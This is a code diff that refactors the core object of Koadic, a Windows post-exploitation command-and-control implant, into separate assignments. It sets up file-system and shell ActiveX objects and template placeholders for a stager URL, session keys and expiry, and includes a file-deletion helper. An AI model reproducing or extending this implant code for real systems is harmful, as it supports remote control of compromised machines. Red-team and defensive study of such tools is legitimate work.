@@ -1,15 +1,12 @@
-var Koadic =
-{
-    FS : new ActiveXObject("Scripting.FileSystemObject"),
-    WS : new ActiveXObject("WScript.Shell"),
+var Koadic = {};
 
-    STAGER : "~URL~",
-    SESSIONKEY : "~SESSIONKEY~",
-    JOBKEY : "~JOBKEY~",
-    JOBKEYPATH : "~URL~?~SESSIONNAME~=~SESSIONKEY~;~JOBNAME~=",
-    EXPIRE : "~_EXPIREEPOCH_~"
-
-};
+Koadic.FS = new ActiveXObject("Scripting.FileSystemObject");
+Koadic.WS = new ActiveXObject("WScript.Shell");
+Koadic.STAGER = "~URL~";
+Koadic.SESSIONKEY = "~SESSIONKEY~";
+Koadic.JOBKEY = "~JOBKEY~";
+Koadic.JOBKEYPATH = "~URL~?~SESSIONNAME~=~SESSIONKEY~;~JOBNAME~=";
+Koadic.EXPIRE = "~_EXPIREEPOCH_~";
 
 /**
  * Sleeps the current thread
@@ -970,4 +967,3 @@ Koadic.file.deleteFile = function(path)
     Koadic.FS.DeleteFile(Koadic.file.getPath(path), true);
 };
 //file.deleteFile.end
-
